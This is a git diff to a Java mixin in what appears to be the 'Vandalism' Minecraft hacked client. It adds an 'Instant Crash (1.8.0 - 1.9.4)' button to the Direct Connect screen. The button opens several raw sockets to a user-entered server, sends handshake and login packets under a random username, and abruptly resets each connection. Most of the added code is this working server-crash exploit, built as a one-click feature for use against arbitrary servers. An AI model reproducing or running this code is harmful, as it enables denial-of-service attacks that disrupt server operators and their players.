@@ -18,18 +18,24 @@
 
 package de.nekosarekawaii.vandalism.injection.mixins.clientsettings;
 
+import com.viaversion.viaversion.api.protocol.version.ProtocolVersion;
+import de.florianmichael.rclasses.common.RandomUtils;
 import de.florianmichael.rclasses.math.timer.MSTimer;
+import de.florianmichael.viafabricplus.protocoltranslator.ProtocolTranslator;
 import de.nekosarekawaii.vandalism.Vandalism;
 import de.nekosarekawaii.vandalism.base.clientsettings.impl.EnhancedServerListSettings;
 import de.nekosarekawaii.vandalism.integration.serverlist.ServerPingerWidget;
+import de.nekosarekawaii.vandalism.util.game.PacketHelper;
 import de.nekosarekawaii.vandalism.util.server.ServerUtil;
 import net.minecraft.client.font.TextRenderer;
 import net.minecraft.client.gui.DrawContext;
 import net.minecraft.client.gui.screen.Screen;
 import net.minecraft.client.gui.screen.multiplayer.DirectConnectScreen;
+import net.minecraft.client.gui.widget.ButtonWidget;
 import net.minecraft.client.gui.widget.TextFieldWidget;
 import net.minecraft.client.network.ServerInfo;
 import net.minecraft.text.Text;
+import net.minecraft.util.Pair;
 import org.spongepowered.asm.mixin.Mixin;
 import org.spongepowered.asm.mixin.Shadow;
 import org.spongepowered.asm.mixin.Unique;
@@ -37,6 +43,9 @@ import org.spongepowered.asm.mixin.injection.At;
 import org.spongepowered.asm.mixin.injection.Inject;
 import org.spongepowered.asm.mixin.injection.Redirect;
 import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
+
+import java.io.DataOutputStream;
+import java.net.Socket;
 
 @Mixin(DirectConnectScreen.class)
 public abstract class MixinDirectConnectScreen extends Screen {
@@ -50,8 +59,46 @@ public abstract class MixinDirectConnectScreen extends Screen {
     @Unique
     private String vandalism$lastAddress = "";
 
+    @Unique
+    private ButtonWidget vandalism$instantCrashButton;
+
     protected MixinDirectConnectScreen(final Text ignored) {
         super(ignored);
+    }
+
+    @Inject(method = "init", at = @At("RETURN"))
+    private void addInstantCrashButton(final CallbackInfo ci) {
+        final EnhancedServerListSettings enhancedServerListSettings = Vandalism.getInstance().getClientSettings().getEnhancedServerListSettings();
+        if (enhancedServerListSettings.enhancedServerList.getValue() && enhancedServerListSettings.directConnectInstantCrashButton.getValue()) {
+            final ProtocolVersion targetVersion = ProtocolTranslator.getTargetVersion();
+            this.vandalism$instantCrashButton = this.addDrawableChild(ButtonWidget.builder(Text.literal("Instant Crash (1.8.0 - 1.9.4)"), button -> {
+                final String address = this.addressField.getText();
+                if (!address.isEmpty()) {
+                    new Thread(() -> {
+                        final Pair<String, Integer> serverAddress = ServerUtil.resolveServerAddress(address);
+                        final String ip = serverAddress.getLeft();
+                        final int port = serverAddress.getRight();
+                        final String username = RandomUtils.randomString(16, 16, true, true, true, false);
+                        final int connections = 3;
+                        final int protocolId = targetVersion.getVersion();
+                        for (int i = 0; i < connections; ++i) {
+                            try {
+                                final Socket connection = new Socket(ip, port);
+                                connection.setTcpNoDelay(true);
+                                final DataOutputStream output = new DataOutputStream(connection.getOutputStream());
+                                PacketHelper.writePacket(PacketHelper.createHandshakePacket(protocolId, ip, port), output);
+                                PacketHelper.writePacket(PacketHelper.createLoginPacket(protocolId, username), output);
+                                connection.setSoLinger(true, 0);
+                                connection.close();
+                                Vandalism.getInstance().getLogger().info("Sent instant crasher to {}:{} with username {}", ip, port, username);
+                            } catch (final Exception ignored) {
+                            }
+                        }
+                    }).start();
+                }
+            }).dimensions(this.width / 2 - 100, this.height / 4 + 96 + 12 - 24, 200, 20).build());
+            this.vandalism$instantCrashButton.active = targetVersion.betweenInclusive(ProtocolVersion.v1_8, ProtocolVersion.v1_9_3) && !this.addressField.getText().isEmpty();
+        }
     }
 
     @Inject(method = "render", at = @At(value = "RETURN"))
@@ -84,6 +131,7 @@ public abstract class MixinDirectConnectScreen extends Screen {
         final EnhancedServerListSettings enhancedServerListSettings = Vandalism.getInstance().getClientSettings().getEnhancedServerListSettings();
         if (enhancedServerListSettings.enhancedServerList.getValue()) {
             String address = this.addressField.getText();
+            this.vandalism$instantCrashButton.active = ProtocolTranslator.getTargetVersion().betweenInclusive(ProtocolVersion.v1_8, ProtocolVersion.v1_9_3) && !address.isEmpty();
             if (address != null && !address.isBlank()) {
                 if (enhancedServerListSettings.directConnectAddressFix.getValue()) {
                     final String oldAddress = address;
